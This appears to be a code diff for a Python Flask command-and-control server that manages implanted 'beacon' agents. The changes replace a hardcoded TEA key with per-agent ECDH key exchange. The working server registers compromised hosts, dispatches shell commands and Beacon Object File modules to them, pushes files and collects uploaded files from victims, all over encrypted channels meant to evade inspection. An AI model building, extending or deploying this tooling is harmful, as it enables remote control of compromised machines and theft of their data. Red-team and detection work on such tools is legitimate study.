@@ -1,59 +1,73 @@
 #!/usr/bin/env python3
-import os, re, sys, json, uuid, threading, logging, struct
+import os, re, sys, json, uuid, threading, logging, struct, hashlib
 from datetime import datetime
 from flask import Flask, request
 
+from cryptography.hazmat.primitives.asymmetric.ec import (
+    ECDH, generate_private_key, SECP256R1, EllipticCurvePublicKey
+)
+from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
+
 # ---------------------------------------------------------------------------
-# TEA CTR encryption (8-byte nonce, 16-byte key)
+# TEA-CTR encryption — key is derived per-agent via ECDH, not hardcoded
 # ---------------------------------------------------------------------------
-ENC_KEY = bytes([
-    0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
-    0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c
-])
 
 def _tea_encrypt(v, k):
     delta = 0x9e3779b9
     s = 0
     for _ in range(32):
-        s = (s + delta) & 0xFFFFFFFF
-        v0 = v[0]
-        v1 = v[1]
+        s  = (s + delta) & 0xFFFFFFFF
+        v0 = v[0]; v1 = v[1]
         v0 = (v0 + (((v1 << 4) + k[0]) ^ (v1 + s) ^ ((v1 >> 5) + k[1]))) & 0xFFFFFFFF
         v1 = (v1 + (((v0 << 4) + k[2]) ^ (v0 + s) ^ ((v0 >> 5) + k[3]))) & 0xFFFFFFFF
         v[0], v[1] = v0, v1
     return v
 
 def _tea_ctr_xor(key, nonce_int, counter, data):
-    k = struct.unpack('<4I', key)
+    k   = struct.unpack('<4I', key)
     ctr = nonce_int + counter
     out = bytearray()
     for off in range(0, len(data), 8):
         stream = struct.pack('<Q', ctr)
-        v = list(struct.unpack('<2I', stream))
-        v = _tea_encrypt(v, k)
+        v      = list(struct.unpack('<2I', stream))
+        v      = _tea_encrypt(v, k)
         stream = struct.pack('<2I', v[0], v[1])
-        chunk = data[off:off+8]
-        out += bytes(b ^ stream[i] for i, b in enumerate(chunk))
-        ctr += 1
+        chunk  = data[off:off + 8]
+        out   += bytes(b ^ stream[i] for i, b in enumerate(chunk))
+        ctr   += 1
     return bytes(out)
 
-def decrypt_request(data: bytes) -> bytes:
+def decrypt_request(key: bytes, data: bytes) -> bytes:
     if len(data) < 8:
         return b''
     nonce = struct.unpack('<Q', data[:8])[0]
-    return _tea_ctr_xor(ENC_KEY, nonce, 0, data[8:])
+    return _tea_ctr_xor(key, nonce, 0, data[8:])
 
-def encrypt_response(plaintext: bytes) -> bytes:
-    nonce = struct.unpack('<Q', os.urandom(8))[0]
-    cipher = _tea_ctr_xor(ENC_KEY, nonce, 0, plaintext)
+def encrypt_response(key: bytes, plaintext: bytes) -> bytes:
+    nonce  = struct.unpack('<Q', os.urandom(8))[0]
+    cipher = _tea_ctr_xor(key, nonce, 0, plaintext)
     return struct.pack('<Q', nonce) + cipher
 
 # ---------------------------------------------------------------------------
-# Flask and terminal code (unchanged from your working version)
+# ECDH-P256 key exchange
+# Beacon sends:  0x04 || X[32] || Y[32]  (65-byte X9.62 uncompressed pubkey)
+# Server replies: 0x04 || X[32] || Y[32] || uuid_str  (65 + 36 = 101 bytes)
+# Both sides derive: SHA-256(shared_secret)[:16]  →  16-byte TEA key
+# ---------------------------------------------------------------------------
+
+def ecdh_derive_tea_key(our_priv, peer_pub_bytes: bytes) -> bytes:
+    """Given our private key and the peer's raw 65-byte X9.62 pubkey, return the 16-byte TEA key."""
+    peer_pub    = EllipticCurvePublicKey.from_encoded_point(SECP256R1(), peer_pub_bytes)
+    shared      = our_priv.exchange(ECDH(), peer_pub)
+    return hashlib.sha256(shared).digest()[:16]
+
+# ---------------------------------------------------------------------------
+# Flask app
 # ---------------------------------------------------------------------------
 app = Flask(__name__)
 logging.getLogger("werkzeug").setLevel(logging.ERROR)
 
+# agents[aid] = { ...metadata..., "key": bytes }
 agents        = {}
 command_queue = {}
 BOF_DIR       = "bofs"
@@ -64,7 +78,7 @@ _print_lock     = threading.Lock()
 _current_prompt = ""
 
 # ---------------------------------------------------------------------------
-# Terminal primitives
+# Terminal primitives (unchanged)
 # ---------------------------------------------------------------------------
 W  = 72
 HR = "─" * W
@@ -178,15 +192,16 @@ def save_state():
         with open(STATE_FILE, "w") as f:
             json.dump(
                 {aid: {"registered": a["registered"].isoformat(),
-                       "outputs": len(a["output_history"])}
+                       "outputs":    len(a["output_history"])}
                  for aid, a in agents.items()},
                 f, indent=2
             )
     except Exception as e:
         async_log(f"State save failed: {e}", "err")
 
-def new_agent():
+def new_agent(key: bytes) -> dict:
     return {
+        "key":            key,
         "last_seen":      datetime.now(),
         "registered":     datetime.now(),
         "output_history": [],
@@ -197,37 +212,75 @@ def new_agent():
     }
 
 # ---------------------------------------------------------------------------
-# Flask routes (encrypted)
+# Flask routes
 # ---------------------------------------------------------------------------
+
 @app.route("/register", methods=["POST"])
 def route_register():
-    plain = decrypt_request(request.data)
-    aid = str(uuid.uuid4())
-    agents[aid]        = new_agent()
+    """
+    ECDH handshake — plaintext, no encryption yet.
+
+    Request body:  65 bytes  — beacon's X9.62 uncompressed P-256 pubkey
+    Response body: 65 bytes  — server's X9.62 uncompressed P-256 pubkey
+                 + 36 bytes  — agent UUID (ASCII)
+    Both sides then derive: TEA key = SHA-256(ECDH shared secret)[:16]
+    All subsequent traffic is TEA-CTR encrypted with that key.
+    """
+    beacon_pub_bytes = request.data
+
+    if len(beacon_pub_bytes) != 65 or beacon_pub_bytes[0] != 0x04:
+        async_log("Bad /register — expected 65-byte X9.62 pubkey", "err")
+        return b"bad request", 400
+
+    try:
+        # Generate ephemeral server keypair
+        server_priv      = generate_private_key(SECP256R1())
+        server_pub_bytes = server_priv.public_key().public_bytes(
+            Encoding.X962, PublicFormat.UncompressedPoint
+        )
+        # Derive the per-agent TEA key
+        tea_key = ecdh_derive_tea_key(server_priv, beacon_pub_bytes)
+    except Exception as e:
+        async_log(f"ECDH failed: {e}", "err")
+        return b"error", 500
+
+    aid                = str(uuid.uuid4())
+    agents[aid]        = new_agent(tea_key)
     command_queue[aid] = None
-    async_log(f"Agent registered   id={c(aid[:8], CYAN)}", "ok")
+
+    async_log(
+        f"Agent registered  id={c(aid[:8], CYAN)}  "
+        f"key={c(tea_key.hex(), DIM)}",
+        "ok"
+    )
     save_state()
-    return encrypt_response(aid.encode()), 200, {"Content-Type": "application/octet-stream"}
+
+    # server pubkey (65) + agent UUID (36)
+    return server_pub_bytes + aid.encode(), 200, {"Content-Type": "application/octet-stream"}
+
 
 @app.route("/checkin/<aid>", methods=["POST"])
 def route_checkin(aid):
-    #print(f"RAW encrypted body (first 32 bytes): {request.data[:32].hex()}")
     if aid not in agents:
-        return encrypt_response(b"unknown"), 404
+        return b"unknown", 404
 
-    agents[aid]["last_seen"] = datetime.now()
-    plain = decrypt_request(request.data)
-    raw = plain.decode("utf-8", errors="ignore").strip()
+    a   = agents[aid]
+    key = a["key"]
+    a["last_seen"] = datetime.now()
+
+    plain = decrypt_request(key, request.data)
+    raw   = plain.decode("utf-8", errors="ignore").strip()
 
     if raw:
-        agents[aid]["bytes_received"] += len(request.data)
-        agents[aid]["output_history"].append({"timestamp": datetime.now(), "output": raw})
-        agents[aid]["last_output"] = raw
+        a["bytes_received"] += len(request.data)
+        a["output_history"].append({"timestamp": datetime.now(), "output": raw})
+        a["last_output"] = raw
 
-        lines = []
-        lines.append(f"\n{c(HL, DIM)}")
-        lines.append(f"  {c('OUTPUT', BOLD + WHITE)}  {c(aid[:8], CYAN)}  {c(ts(), GREY)}")
-        lines.append(c(HR, DIM))
+        lines = [
+            f"\n{c(HL, DIM)}",
+            f"  {c('OUTPUT', BOLD + WHITE)}  {c(aid[:8], CYAN)}  {c(ts(), GREY)}",
+            c(HR, DIM),
+        ]
         for line in raw.splitlines():
             lines.append(f"  {line}")
         lines.append(c(HR, DIM))
@@ -235,20 +288,22 @@ def route_checkin(aid):
 
     cmd = command_queue.get(aid)
     if cmd:
-        command_queue[aid] = None
-        agents[aid]["command_count"] += 1
-        agents[aid]["bytes_sent"]    += len(cmd)
+        command_queue[aid]  = None
+        a["command_count"] += 1
+        a["bytes_sent"]    += len(cmd)
         preview = cmd[:55] + ("..." if len(cmd) > 55 else "")
         async_log(f"Dispatch  {c(aid[:8], CYAN)}  {c(preview, DIM)}", "send")
-        return encrypt_response(cmd.encode()), 200, {"Content-Type": "application/octet-stream"}
+        return encrypt_response(key, cmd.encode()), 200, {"Content-Type": "application/octet-stream"}
 
-    return encrypt_response(b""), 200
+    return encrypt_response(key, b""), 200
+
 
 @app.route("/getbof/<aid>/<name>", methods=["POST"])
 def route_getbof(aid, name):
     if aid not in agents:
-        return encrypt_response(b"unknown"), 404
+        return b"unknown", 404
 
+    key  = agents[aid]["key"]
     base = os.path.basename(name)
     for suffix in (".obj", ".o"):
         if base.endswith(suffix):
@@ -258,43 +313,53 @@ def route_getbof(aid, name):
 
     if not os.path.exists(path):
         async_log(f"BOF not found: {base}", "err")
-        return encrypt_response(b"not found"), 404
+        return encrypt_response(key, b"not found"), 404
 
     with open(path, "rb") as f:
         data = f.read()
 
     agents[aid]["bytes_sent"] += len(data)
     async_log(f"BOF served  {c(base, CYAN)}  {fmt_bytes(len(data))}  to {c(aid[:8], CYAN)}", "down")
-    return encrypt_response(data), 200, {"Content-Type": "application/octet-stream"}
+    return encrypt_response(key, data), 200, {"Content-Type": "application/octet-stream"}
+
 
 @app.route("/upload/<aid>/<filename>", methods=["POST"])
 def route_upload(aid, filename):
     if aid not in agents:
-        return encrypt_response(b"unknown"), 404
-    plain = decrypt_request(request.data)
-    dest = os.path.join(UPLOAD_DIR, aid[:8])
+        return b"unknown", 404
+
+    key   = agents[aid]["key"]
+    plain = decrypt_request(key, request.data)
+    dest  = os.path.join(UPLOAD_DIR, aid[:8])
     os.makedirs(dest, exist_ok=True)
     with open(os.path.join(dest, filename), "wb") as f:
         f.write(plain)
+
     agents[aid]["bytes_received"] += len(request.data)
     async_log(f"Upload  {c(filename, CYAN)}  {fmt_bytes(len(plain))}  from {c(aid[:8], CYAN)}", "up")
-    return encrypt_response(b"OK"), 200
+    return encrypt_response(key, b"OK"), 200
+
 
 @app.route("/download/<aid>/<filename>", methods=["POST"])
 def route_download(aid, filename):
     if aid not in agents:
-        return encrypt_response(b"unknown"), 404
+        return b"unknown", 404
+
+    key = agents[aid]["key"]
     if not os.path.exists(filename):
         async_log(f"File not found: {filename}", "err")
-        return encrypt_response(b"not found"), 404
+        return encrypt_response(key, b"not found"), 404
+
     with open(filename, "rb") as f:
         data = f.read()
+
     agents[aid]["bytes_sent"] += len(data)
     async_log(f"Download  {c(filename, CYAN)}  {fmt_bytes(len(data))}  to {c(aid[:8], CYAN)}", "down")
-    return encrypt_response(data), 200, {"Content-Type": "application/octet-stream"}
+    return encrypt_response(key, data), 200, {"Content-Type": "application/octet-stream"}
+
 
 # ---------------------------------------------------------------------------
-# BOF argument packing (from beacon_generate)
+# BOF argument packing
 # ---------------------------------------------------------------------------
 try:
     from beacon_generate import BeaconPack
@@ -302,7 +367,7 @@ except ImportError:
     sys.exit("FATAL  beacon_generate.py not found")
 
 # ---------------------------------------------------------------------------
-# CLI commands
+# CLI commands (unchanged)
 # ---------------------------------------------------------------------------
 def cmd_list():
     header("AGENTS")
@@ -334,19 +399,16 @@ def cmd_bofs():
         os.makedirs(BOF_DIR, exist_ok=True)
         print(f"  {c('directory created — drop .obj files here', GREY)}\n")
         return
-
     files = [f for f in os.listdir(BOF_DIR) if f.endswith((".obj", ".o"))]
     if not files:
         print(f"  {c('no modules found', GREY)}\n")
         return
-
     table_header((32, "NAME"), (12, "SIZE"), (10, "FORMAT"))
     for f in sorted(files):
         ext  = ".obj" if f.endswith(".obj") else ".o"
         base = f[:-len(ext)]
         size = os.path.getsize(os.path.join(BOF_DIR, f))
         table_row((32, c(base, WHITE)), (12, fmt_bytes(size)), (10, c(ext, GREY)))
-
     print(f"\n  {c(str(len(files)) + ' module(s)', GREY)}")
     section_end()
 
@@ -356,6 +418,7 @@ def cmd_info(aid):
     row("ID",             c(aid, CYAN))
     row("Short ID",       c(aid[:8], CYAN))
     row("Status",         agent_status(a["last_seen"]))
+    row("Session key",    c(a["key"].hex(), DIM))
     row("Registered",     a["registered"].strftime("%Y-%m-%d %H:%M:%S"))
     row("Last seen",      a["last_seen"].strftime("%H:%M:%S") + f"  ({fmt_age(a['last_seen'])})")
     print()
@@ -371,7 +434,7 @@ def cmd_info(aid):
     section_end()
 
 def cmd_stats(aid):
-    a = agents[aid]
+    a      = agents[aid]
     uptime = (datetime.now() - a["registered"]).total_seconds()
     header("STATISTICS", sub=aid[:8])
     row("Uptime",    f"{int(uptime)}s  ({int(uptime/60)}m)")
@@ -413,7 +476,7 @@ def cmd_help():
             ("shell <cmd>",        "execute shell command"),
             ("bof <name> [args]",  "execute BOF module"),
             ("output [n]",         "show last N outputs  (default 10)"),
-            ("info",               "agent details"),
+            ("info",               "agent details + session key"),
             ("stats",              "session statistics"),
             ("back",               "deselect agent"),
         ]),
@@ -466,7 +529,10 @@ def interactive_shell():
 
     while True:
         try:
-            prompt = f" {c(current[:8], CYAN) if current else ''} {c('>', GREY)} " if current else f" {c('>', GREY)} "
+            prompt = (
+                f" {c(current[:8], CYAN)} {c('>', GREY)} "
+                if current else f" {c('>', GREY)} "
+            )
             with _print_lock:
                 _current_prompt = prompt
                 sys.stdout.write(prompt)
@@ -487,19 +553,14 @@ def interactive_shell():
                 print(f"\n  {c('shutting down', GREY)}\n")
                 save_state()
                 break
-
             elif cmd == "clear":
                 os.system("cls" if os.name == "nt" else "clear")
-
             elif cmd == "list":
                 cmd_list()
-
             elif cmd == "bofs":
                 cmd_bofs()
-
             elif cmd == "help":
                 cmd_help()
-
             elif cmd == "use":
                 if not args:
                     log("usage: use <agent_id>", "err")
@@ -510,25 +571,21 @@ def interactive_shell():
                 else:
                     current = aid
                     log(f"selected {c(aid[:8], CYAN)}", "ok")
-
             elif cmd == "back":
                 if current:
                     log(f"deselected {c(current[:8], CYAN)}", "ok")
                     current = None
                 else:
                     log("no agent selected", "warn")
-
             elif cmd in ("shell", "bof", "output", "info", "stats"):
                 if not current:
                     log("no agent selected  (use: use <id>)", "err")
                     continue
-
                 if cmd == "shell":
                     if not args:
                         log("usage: shell <command>", "err")
                     else:
                         send_cmd(current, args)
-
                 elif cmd == "bof":
                     if not args:
                         log("usage: bof <name> [type:arg ...]", "err")
@@ -536,17 +593,13 @@ def interactive_shell():
                         bof_parts = args.split(maxsplit=1)
                         send_bof(current, bof_parts[0],
                                  bof_parts[1] if len(bof_parts) > 1 else "")
-
                 elif cmd == "output":
                     n = int(args) if args.isdigit() else 10
                     cmd_output(current, n)
-
                 elif cmd == "info":
                     cmd_info(current)
-
                 elif cmd == "stats":
                     cmd_stats(current)
-
             else:
                 log(f"unknown command: {cmd}  (type help)", "err")
 
@@ -554,7 +607,6 @@ def interactive_shell():
             print()
             log("interrupted  (exit to quit, back to deselect)", "warn")
             current = None
-
         except Exception as e:
             log(str(e), "err")
             import traceback; traceback.print_exc()
@@ -575,7 +627,7 @@ if __name__ == "__main__":
 
     threading.Thread(target=_flask, daemon=True).start()
 
-    log(f"listening    0.0.0.0:8080", "ok")
+    log("listening    0.0.0.0:8080", "ok")
     log(f"bof dir      {os.path.abspath(BOF_DIR)}", "ok")
     log(f"upload dir   {os.path.abspath(UPLOAD_DIR)}", "ok")
     print()
